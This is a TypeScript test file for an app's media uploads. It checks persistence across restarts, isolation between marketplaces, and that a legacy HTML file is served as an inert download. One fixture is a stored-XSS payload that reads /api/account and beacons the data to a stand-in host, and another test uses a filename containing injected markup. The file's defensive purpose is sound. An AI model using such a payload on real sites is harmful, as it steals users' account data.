import { test, after } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import postgres from "postgres";
import { liveSlice } from "@/lib/data";
import { NormalizedLiveStore } from "@/lib/data/normalized/store";
import { getMediaWithBytes, putMedia } from "@/lib/data/mock/media-store";
import { checkUpload, serveHeaders } from "@/lib/media/policy";

/**
 * Uploads on the disposable database: an accepted file survives a restart (read back by a
 * separate process) in both live stores, stays in its own marketplace, and a file stored before
 * the upload check existed (HTML saved as text/html) is served as an inert download.
 */

const url = process.env.DATABASE_URL!;
assert.match(url, /127\.0\.0\.1:\d+\/clutch_test$/, "only ever the disposable test database");
const db = postgres(url, { prepare: false, max: 1, onnotice: () => undefined });
const A = NormalizedLiveStore.connect(url, { reads: "targeted" });
after(async () => {
  await Promise.all([A.end(), db.end({ timeout: 5 })]);
});

const jpeg = new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0, 0x10, ...new TextEncoder().encode("JFIF"), ...new Uint8Array(200).fill(7)]);

/** Read a stored file from a NEW process, as the app would after a restart. */
function readInNewProcess(scope: "live" | "demo", id: string, store: string) {
  const code = `
    const ms = await import(${JSON.stringify(`${process.cwd()}/lib/data/mock/media-store.ts`)});
    const pol = await import(${JSON.stringify(`${process.cwd()}/lib/media/policy.ts`)});
    const getMediaWithBytes = ms.getMediaWithBytes ?? ms.default.getMediaWithBytes;
    const serveHeaders = pol.serveHeaders ?? pol.default.serveHeaders;
    const m = await getMediaWithBytes(${JSON.stringify(scope)}, ${JSON.stringify(id)});
    console.log(JSON.stringify(m ? { name: m.meta.name, type: m.meta.contentType, kind: m.meta.kind, size: m.bytes.byteLength, first: Array.from(m.bytes.slice(0, 3)), headers: serveHeaders(${JSON.stringify(id)}, m.meta, m.bytes) } : null));
    process.exit(0);
  `;
  const r = spawnSync("npx", ["tsx", "--conditions", "react-server", "--eval", code], { env: { ...process.env, CLUTCH_LIVE_STORE: store }, encoding: "utf8" });
  assert.equal(r.status, 0, r.stderr);
  return JSON.parse(r.stdout.trim().split("\n").at(-1)!);
}

for (const store of ["normalized", ""] as const) {
  test(`an accepted upload persists across a restart and is served inert (${store || "snapshot"} store)`, async () => {
    const before = process.env.CLUTCH_LIVE_STORE;
    process.env.CLUTCH_LIVE_STORE = store;
    try {
      // A real live account owns it (the normalized store enforces that with a foreign key).
      const u = await liveSlice(A).repo.createUser({ id: `media-owner-${store || "snap"}-${process.pid}`, name: "Casey", email: `media-${store || "snap"}-${process.pid}@example.test`, role: "customer" });
      const v = checkUpload({ name: 'IMG_7 "<b>.jpg', declaredType: "image/jpeg", bytes: jpeg, tag: "damage", role: "customer" });
      assert.ok(v.ok);
      const m = await putMedia("live", u.id, { displayName: v.displayName, contentType: v.contentType, kind: v.kind, bytes: jpeg }, "damage");
      const again = readInNewProcess("live", m.id, store);
      assert.deepEqual({ name: again.name, type: again.type, kind: again.kind, size: again.size, first: again.first }, { name: "IMG_7 b.jpg", type: "image/jpeg", kind: "photo", size: jpeg.byteLength, first: [0xff, 0xd8, 0xff] });
      assert.equal(again.headers["X-Content-Type-Options"], "nosniff");
      assert.match(again.headers["Content-Disposition"], /^inline; filename="clutch-photo-[a-f0-9]{8}\.jpg"$/);
      assert.equal(readInNewProcess("demo", m.id, store), null, "not visible from the demo marketplace");
    } finally {
      process.env.CLUTCH_LIVE_STORE = before;
    }
  });
}

test("a file stored before the upload check (HTML as text/html) is served as an inert download", async () => {
  const id = `legacy-${process.pid}`;
  const html = new TextEncoder().encode("<!doctype html><script>fetch('/api/account').then(r=>r.text()).then(t=>navigator.sendBeacon('//x',t))</script>");
  await db`insert into app_media (id, owner_id, meta, bytes, scope) values (${id}, 'legacy-owner', ${db.json({ id, kind: "document", tag: "other", name: "estimate.html", contentType: "text/html", size: html.length, uploadedAt: "2026-01-01", url: `/api/media/${id}` })}, ${Buffer.from(html)}, 'demo')`;
  const m = await getMediaWithBytes("demo", id);
  assert.ok(m);
  const h = serveHeaders(id, m.meta, m.bytes);
  assert.equal(h["Content-Type"], "application/octet-stream");
  assert.match(h["Content-Disposition"], /^attachment; filename="clutch-file-[a-z0-9]+\.bin"$/);
  assert.equal(h["X-Content-Type-Options"], "nosniff");
  assert.match(h["Content-Security-Policy"], /sandbox/);
});
